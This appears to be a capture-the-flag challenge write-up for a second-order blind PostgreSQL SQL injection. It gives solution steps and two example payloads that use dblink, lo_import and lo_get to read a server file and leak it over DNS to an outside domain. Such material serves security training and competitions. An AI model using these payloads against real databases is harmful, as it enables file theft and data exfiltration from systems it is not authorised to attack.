**Challenge description:** This challenge is a second-order blind SQLi (only displaying if a SQL syntax error occurs) where participants have to retrieve the flag from an internal file and leak it over DNS by using dblink to establish an outbound connection.  

**Solution description**
1. When opening the web page one of the first things you notice is an error leaking the file /var/lib/postgresql/data/secret which is where the flag is located.
2. Furthermore there are a couple possibilities to interact with the website. One is a disabled input field which maps to the GET parameter user_search
3. If one single quote is added to this GET parameter and then another request is made a warning will show hinting that this field might be vulnerable in the backend (SQL injection is lagging one request).
4. From here the participant can figure out the backend is vulnerable to SQL injection and uses Postgresql.
5. Since SLEEP commands won't work the participant will have to find a way around this (early timeout) which can be done using dblink.
6. Dblink() makes an outbound connection and can thus leak information over DNS, from here the participant can use lo_import() and lo_get() to leak files from the filesystem.
7. If the participant leaks /var/lib/postgresql/data/secret they have found the flag.

Example payloads for user_search
- 1' AND (SELECT a FROM dblink('host='||(SELECT lo_import('/var/lib/postgresql/data/secret'))||'.exdample.com dbname=docker_db user=postgres password=tiger','SELECT 1') AS t1(a text))::text = ''-- 
- 1' AND (SELECT a FROM dblink('host='||(SELECT lo_get(16450,3,10)::text)||'.exdample.com dbname=docker_db user=postgres password=tiger','SELECT 1') AS t1(a text))::text = ''--

**Challenge description:** web
**Setup instructions:** docker-compose up   
**Which files should be distributed:** none
**Estimated difficulty:** medium
